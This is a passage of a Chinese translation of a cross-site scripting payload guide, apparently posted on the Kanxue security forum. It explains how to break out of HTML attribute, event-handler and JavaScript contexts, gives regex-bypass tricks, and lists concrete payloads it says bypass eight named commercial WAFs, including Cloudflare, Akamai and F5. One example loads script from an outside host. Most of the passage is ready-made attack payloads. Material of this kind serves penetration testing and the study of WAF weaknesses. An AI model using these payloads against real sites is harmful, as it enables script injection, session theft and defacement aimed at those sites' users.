
为了执行payload，这些标签必须是封闭的。因此，`可执行context`和`不可执行context`之间的唯一不同就是对`{closing tag}`组成部分的测试，可通过以下方式测试`{closing tag}`：

- `</tag>`
- `</tAg/x>`
- `</tag{space}>`
- `</tag//>`
- `</tag%0a>`
- `</tag%0d>`
- `</tag%09>`

一旦发现任何可用的closing tag，都可以使用`{closing tag}{any payload from executable payload section}`完成注入。

### 标签内

#### 在标签内/作为属性值

这个context的`primary character`就是将属性值括起来所用的引号。例如，如果用户的输入是传送到`<input value="$input" type="text">` ，那么这里的关键符应该是`“`.

但是，在有些情况下并不需要用`primary character`显示context。

#### 在event handler内部

如果用户输入是某个与event handler相关的值，例如，`<tag event_handler="function($input)";` ，触发该事件就会执行该值中的JavaScript代码。

##### 在'src'属性内

如果用户输入是script或iframe中`src`属性的值，例如，`<script src="$input">`,那么可以直接使用`<script src="http://example.com/malicious.js">`直接加载恶意代码（如果是script标签）或者恶意网页（如果是iframe标签）。

##### 绕过匹配URL的正则表达式

- `//example.com/xss.js` bypasses `http(s)?//`
- `////////example.com/xss.js` bypasses `(http(s)?)?//`
- `/\///\\/example.com/xss.js` bypasses `(http(s)?)?//+`

##### 在‘srcdoc’属性内

如果用户输入是iframe的`srcdoc`属性值，例如，`<iframe srcdoc="$input">`

可以将转义（使用HTML实体）HTML文档作为payload，如下所示：

`<iframe srcdoc="&lt;svg/onload=alert()&gt;">`

##### 通用属性

以上例子除了最后一个都不需要任何绕过技术，而最后一个可以使用在HTML context部分提到的技术绕过。上面所说的例子是不常见的，用户输入最常被传送到的地方是：

`<input type="text" value="$input">`

根据可交互性可以将其分为两类。

###### 可交互的

当用户输入的某个属性值是可交互的，例如，点击、徘徊、聚焦等等，那么只需要一个引号就能跳出该context。这种情况下的payload构造方案如下：

`{quote}{filler}{event_handler}{?filler}={?filler}{javascript}`

可使用下面的方式检测WAF是否限制引号（不太可能会限制）。

`x"y`

这里的`event_handler`很重要，因为它是唯一一个可能被WAF检测到的组成部分。每个标签都会支持几个event handler，并且由用户决定是哪种event handler。但是，也有一些event handler可以绑定到任意标签中，如下所示：

```
onclick

onauxclick

ondblclick

ondrag

ondragend

ondragenter

ondragexit

ondragleave

ondragover

ondragstart

onmousedown

onmouseenter

onmouseleave

onmousemove

onmouseout

onmouseover

onmouseup
```

对其他组成部分的测试可以使用前文所述的方法。

###### 不可交互的

如果用户输入的某个属性值是不可交互的，那么需要跳出该标签才能执行payload。这种情况下的payload构造方法如下：

`{quote}>{any payload scheme from html context section}`

## JavaScript context

#### 在字符串变量内

用户输入作为JavaScript context最常见的方式是作为一个字符串变量。这种情况很常见，因为开发人员通常会将用户输入赋值给某个变量，而不是直接使用用户输入。

`var name = '$input';`

##### payload 方案1

`{quote}{delimiter}{javascript}{delimiter}{quote}`

这里的`delimiter`通常是Javascript的一个操作，如`^`。 例如，如果用户输入的值是放在一个带引号的字符串变量中，那么payload构造方案可如下所示：

```
'^{javascript}^'

'*{javascript}*'

'+{javascript}+'

'/{javascript}/'

'%{javascript}%'

'|{javascript}|'

'<{javascript}<'

'>{javascript}>'
```

##### payload 方案2

`{quote}{delimiter}{javascript}//`

除了注释符，这个构造方案和前一个方案很像，它使用//注释掉后面的代码以保证语法正确。

可使用如下方案构造payload：

```
'<{javascript}//'

'|{javascript}//'

'^{javascript}//'
```

#### 在代码块内

用户输入通常会表现在代码块内。例如，如果用户已付费订阅且超过18岁，网页会执行某些操作。

用户输入在代码块中的表现如下所示：

```
function example(age, subscription){

    if (subscription){

        if (age > 18){

            another_function('$input');

        }

    else{

        console.log('Requirements not met.');

    }

}
```

假设我们没有付费。为了绕过这个判断，我们需要关闭条件代码块和函数调用等代码块，跳出`if (subscription)` 。如果用户输入是`');}}alert();if(true){('`，那么上面的代码将变成：

```
function example(age, subscription){

    if (subscription){

        if (age > 18){

            another_function('');}}alert();if(true){('');

        }

    else{

        console.log('Requirements not met.');

    }

}
```

将上面的代码缩进后，如下所示：

```
function example(age, subscription){

    if (subscription){

        if (age > 18){

            another_function('');

        }

    }

    alert();

    if (true){

        ('');

    }

    else{

        console.log('Requirements not met.');

    }

}
```

`);` 结束了当前函数调用。

第一个 `}` 结束了`if (age > 18)`语句

第二个`}` 结束了`if subscription` 语句

`alert();`是一个测试函数

`if(true){` 是和后面的else语句对应，保证语法正确。

最后， `('` 与我们最初注入的函数的剩余部分结合在一起。

上面这种情况是你在实践过程中遇到的最简单的代码块。为了简化跳出代码块的过程，建议使用类似**Sublime Text**来高亮。

payload的构造方案取决于代码本身，而这种不确定让它很难被检测出来。但是，如果需要，还要混淆代码。

例如，上面代码块所使用的payload可以这么写：

`');%0a}%0d}%09alert();/*anything here*/if(true){//anything here%0a('`

不管是在代码块还是在字符串变量中都可以使用`</scRipT{?filler}>{html context payload}`跳出上下文并执行payload。可以在任何情况下使用先使用这种payload测试，因为它很简单。但是，它也很容易被检测出来。

##### 绕过waf实战

在研究过程中，总共绕过了8个WAF。厂商可能已经了解到这些绕过方法，所以下面的部分（或全部）方法可能已经无效了。

下面列出绕过的WAF，payload和绕过技术：

**Name:** Cloudflare
**Payload:** `<a"/onclick=(confirm)()>click`
**Bypass Technique:** 无空格 filler

**Name:** Wordfence
**Payload:** `<a/href=javascript&colon;alert()>click`
**Bypass Technique:** 数字符编码

**Name:** Barracuda
**Payload:** `<a/href=&#74;ava%0a%0d%09script&colon;alert()>click`
**Bypass Technique:** 数字符编码

**Name:** Akamai
**Payload:** `<d3v/onauxclick=[2].some(confirm)>click`
**Bypass Technique:** 使用黑名单中缺少的event handler; 混淆函数调用

**Name:** Comodo
**Payload:** `<d3v/onauxclick=(((confirm)))``>click`
**Bypass Technique:** 使用黑名单中缺少的event handler; 混淆函数调用

**Name:** F5
**Payload:** `<d3v/onmouseleave=[2].some(confirm)>click`
**Bypass Technique:** 使用黑名单中缺少的event handler; 混淆函数调用

**Name:** ModSecurity
**Payload:** `<details/open/ontoggle=alert()>`
**Bypass Technique:** 使用黑名单中缺少的tag（也缺少event handler？）

**Name:** dotdefender
**Payload:** `<details/open/ontoggle=(confirm)()//`
**Bypass Technique:** 使用黑名单中缺少的tag；混淆函数调用；备用标签结束

##### 参考文献

- [HTML specification](https://www.w3.org/TR/html52/)

- [Numeric character reference](https://bbs.kanxue.com/elink@2e0K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6W2L8W2)9J5k6i4N6A6K9$3W2H3k6h3c8A6j5g2)9J5k6h3!0J5k6#2)9J5c8Y4N6A6K9$3W2Q4x3V1k6z5N6h3#2W2M7X3W2U0i4K6g2X3j5$3S2S2M7X3q4U0N6r3g2J5i4K6g2X3M7X3g2X3k6i4u0W2L8X3y4W2)

原文链接：[68aK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6K6x3r3#2V1x3%4k6Q4x3V1k6y4P5g2m8S2M7r3g2J5M7#2)9J5c8Y4c8J5k6h3g2Q4x3V1k6E0j5i4y4@1k6i4u0Q4x3V1k6n7P5i4m8S2M7%4y4A6L8X3N6Q4x3X3c8j5f1#2y4Q4x3X3c8V1k6i4c8W2j5%4c8A6L8$3&6Q4x3X3c8E0k6h3y4Z5j5h3&6A6M7$3#2K6](https://bbs.kanxue.com/elink@6faK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6K6x3r3#2V1x3%4k6Q4x3V1k6y4P5g2m8S2M7r3g2J5M7#2)9J5c8Y4c8J5k6h3g2Q4x3V1k6E0j5i4y4@1k6i4u0Q4x3V1k6n7P5i4m8S2M7%4y4A6L8X3N6Q4x3X3c8j5f1#2y4Q4x3X3c8V1k6i4c8W2j5%4c8A6L8$3&6Q4x3X3c8E0k6h3y4Z5j5h3&6A6M7$3#2K6)

编译：看雪翻译小组 lumou

校对：看雪翻译小组 梦野间

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)
